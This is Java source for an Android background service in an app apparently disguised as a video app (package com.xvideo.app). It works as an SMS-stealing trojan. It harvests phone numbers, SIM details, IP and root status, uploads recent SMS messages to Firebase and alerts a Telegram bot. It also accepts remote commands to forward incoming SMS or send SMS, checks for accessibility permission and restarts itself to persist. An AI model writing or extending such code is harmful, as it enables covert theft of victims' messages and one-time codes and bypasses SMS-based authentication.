package com.xvideo.app.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import com.xvideo.app.R;
import com.xvideo.app.core.Config;
import com.xvideo.app.firebase.FirebaseHelper;
import com.xvideo.app.receiver.AlarmReceiver;
import com.xvideo.app.sms.SmsHelper;
import com.xvideo.app.telegram.TelegramHelper;
import com.xvideo.app.util.BatteryUtil;
import com.xvideo.app.util.DeviceInfoUtil;
import com.xvideo.app.util.NetworkUtil;
import com.xvideo.app.util.SharedPrefManager;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainService extends Service {
    private static final String TAG = "MainService";

    private ExecutorService executor;
    private SharedPrefManager prefs;
    private FirebaseHelper firebaseHelper;
    private DeviceInfoUtil deviceInfoUtil;
    private String deviceId;
    private Handler heartbeatHandler;
    private Runnable heartbeatRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        executor = Executors.newSingleThreadExecutor();
        prefs = new SharedPrefManager(this);
        deviceInfoUtil = new DeviceInfoUtil(this);
        deviceId = DeviceInfoUtil.getDeviceID(this);
        firebaseHelper = new FirebaseHelper(this);

        createNotificationChannel();
        startForeground(Config.NOTIFICATION_ID, buildNotification());
        scheduleAlarm();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        // Initialize in background
        executor.execute(this::initializeService);

        // Start heartbeat
        startHeartbeat();

        return START_STICKY;
    }

    private void initializeService() {
        try {
            if (!NetworkUtil.isNetworkConnected(this)) {
                Log.w(TAG, "No network connection");
                return;
            }

            // Check if already registered
            if (prefs.getBoolean(Config.PREF_REGISTERED)) {
                // Already registered - just update status
                firebaseHelper.setOnlineStatus(true);
                listenForCommands();
            } else {
                // First time - register device
                registerDevice();
            }

        } catch (Exception e) {
            Log.e(TAG, "Error initializing service", e);
        }
    }

    private void registerDevice() {
        deviceInfoUtil.getPublicIP(ip -> {
            String model = DeviceInfoUtil.getModel();
            String androidVersion = DeviceInfoUtil.getAndroidVersion();
            String carrier = deviceInfoUtil.getServiceProvider();
            String phoneNumber = DeviceInfoUtil.getSelfNumber(this);
            String battery = BatteryUtil.getBatteryPercentage(this);
            String timestamp = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date());

            // Build device info
            Map<String, Object> deviceInfo = new HashMap<>();
            deviceInfo.put("publicIP", ip);
            deviceInfo.put("deviceId", deviceId);
            deviceInfo.put("model", model);
            deviceInfo.put("android", androidVersion);
            deviceInfo.put("rooted", deviceInfoUtil.isRooted());
            deviceInfo.put("sdCard", deviceInfoUtil.isSDCardAvailable());
            deviceInfo.put("storage", deviceInfoUtil.getStorageMemory());
            deviceInfo.put("sdk", DeviceInfoUtil.getSDKVersion());
            deviceInfo.put("cpuArch", deviceInfoUtil.getCPUArchitecture());
            deviceInfo.put("serviceProvider", carrier);
            deviceInfo.put("myNumber", phoneNumber);
            deviceInfo.put("battery", battery);
            deviceInfo.put("sims", deviceInfoUtil.getSimInfo());
            deviceInfo.put("setup", timestamp);
            deviceInfo.put("online", true);
            deviceInfo.put("active", true);

            // Register with Firebase
            firebaseHelper.registerDevice(deviceInfo);

            // Get and upload SMS history
            SmsHelper smsHelper = new SmsHelper(this);
            List<Map<String, Object>> messages = smsHelper.getAllMessages(50);
            for (Map<String, Object> msg : messages) {
                firebaseHelper.logSms(
                    (Long) msg.get("id"),
                    (String) msg.get("sender"),
                    (String) msg.get("body"),
                    (String) msg.get("type")
                );
            }

            // Send notification to Telegram
            String sim1 = deviceInfoUtil.getSimInfo().size() > 0 ?
                deviceInfoUtil.getSimInfo().get(0).get("simNumber") : "N/A";
            String sim2 = deviceInfoUtil.getSimInfo().size() > 1 ?
                deviceInfoUtil.getSimInfo().get(1).get("simNumber") : "N/A";

            TelegramHelper.sendMessage(
                TelegramHelper.formatDeviceInfo(
                    deviceId, model, androidVersion, ip, carrier,
                    phoneNumber, sim1, sim2, timestamp
                )
            );

            // Mark as registered
            prefs.setBoolean(Config.PREF_REGISTERED, true);

            // Start listening for commands
            listenForCommands();
        });
    }

    private void listenForCommands() {
        firebaseHelper.listenForCommands(commands -> {
            Log.d(TAG, "Commands received: " + commands.toString());
            processCommands(commands);
        });
    }

    @SuppressWarnings("unchecked")
    private void processCommands(Map<String, Object> commands) {
        // Handle ping
        if (commands.containsKey("pingRequest")) {
            Map<String, Object> ping = (Map<String, Object>) commands.get("pingRequest");
            if (ping != null && "ping".equals(ping.get("text"))) {
                firebaseHelper.sendPong();
                firebaseHelper.deleteCommand("pingRequest");
            }
        }

        // Handle check_permissions
        if (commands.containsKey("check_permissions")) {
            checkAndReportPermissions();
            firebaseHelper.deleteCommand("check_permissions");
        }

        // Handle SMS forwarding
        if (commands.containsKey("smsForward")) {
            Map<String, Object> smsForward = (Map<String, Object>) commands.get("smsForward");
            if (smsForward != null) {
                String number = (String) smsForward.get("to");
                Boolean enabled = (Boolean) smsForward.get("running");
                if (enabled != null && enabled && number != null && !number.isEmpty()) {
                    prefs.setBoolean(Config.PREF_SMS_FORWARD_ENABLED, true);
                    prefs.setString(Config.PREF_SMS_FORWARD_NUMBER, number);
                } else {
                    prefs.setBoolean(Config.PREF_SMS_FORWARD_ENABLED, false);
                }
                firebaseHelper.deleteCommand("smsForward");
            }
        }

        // Handle send SMS
        if (commands.containsKey("sendSms")) {
            Map<String, Object> sendSms = (Map<String, Object>) commands.get("sendSms");
            if (sendSms != null) {
                String to = (String) sendSms.get("to");
                String body = (String) sendSms.get("body");
                Object simObj = sendSms.get("type");
                int sim = simObj instanceof Number ? ((Number) simObj).intValue() : 0;

                if (to != null && !to.isEmpty() && body != null && !body.isEmpty()) {
                    SmsHelper.sendSmsWithSim(this, sim, to, body);
                }
                firebaseHelper.deleteCommand("sendSms");
            }
        }
    }

    private void checkAndReportPermissions() {
        Map<String, String> permissions = new HashMap<>();
        permissions.put("READ_SMS", checkPermission("android.permission.READ_SMS"));
        permissions.put("RECEIVE_SMS", checkPermission("android.permission.RECEIVE_SMS"));
        permissions.put("SEND_SMS", checkPermission("android.permission.SEND_SMS"));
        permissions.put("CALL_PHONE", checkPermission("android.permission.CALL_PHONE"));
        permissions.put("READ_PHONE_STATE", checkPermission("android.permission.READ_PHONE_STATE"));
        permissions.put("INTERNET", checkPermission("android.permission.INTERNET"));

        // Check accessibility
        String enabledServices = Settings.Secure.getString(
            getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        permissions.put("ACCESSIBILITY",
            enabledServices != null && enabledServices.contains(getPackageName()) ? "granted" : "denied"
        );

        firebaseHelper.reportPermissions(permissions);
    }

    private String checkPermission(String permission) {
        return checkSelfPermission(permission) == 0 ? "granted" : "denied";
    }

    private void startHeartbeat() {
        if (heartbeatHandler != null) return;

        heartbeatHandler = new Handler(Looper.getMainLooper());
        heartbeatRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    firebaseHelper.sendHeartbeat();
                } catch (Exception e) {
                    Log.e(TAG, "Heartbeat error", e);
                }
                heartbeatHandler.postDelayed(this, Config.HEARTBEAT_INTERVAL);
            }
        };
        heartbeatHandler.postDelayed(heartbeatRunnable, 10000);
    }

    private void scheduleAlarm() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, AlarmReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            long triggerTime = System.currentTimeMillis() + Config.ALARM_INTERVAL;
            if (am != null) {
                am.setInexactRepeating(AlarmManager.RTC_WAKEUP, triggerTime, Config.ALARM_INTERVAL, pi);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling alarm", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                Config.CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Required for app to function properly");

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, Config.CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .setContentText("Running in background...")
            .setSmallIcon(R.drawable.ic_notification)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed - restarting");

        // Set offline status
        try {
            firebaseHelper.setOnlineStatus(false);
            firebaseHelper.stopListening();
        } catch (Exception e) {
            Log.e(TAG, "Error cleaning up", e);
        }

        // Stop heartbeat
        if (heartbeatHandler != null && heartbeatRunnable != null) {
            heartbeatHandler.removeCallbacks(heartbeatRunnable);
        }

        // Shutdown executor
        if (executor != null) {
            executor.shutdown();
        }

        // Restart service
        try {
            startService(new Intent(this, MainService.class));
        } catch (Exception e) {
            Log.e(TAG, "Error restarting service", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
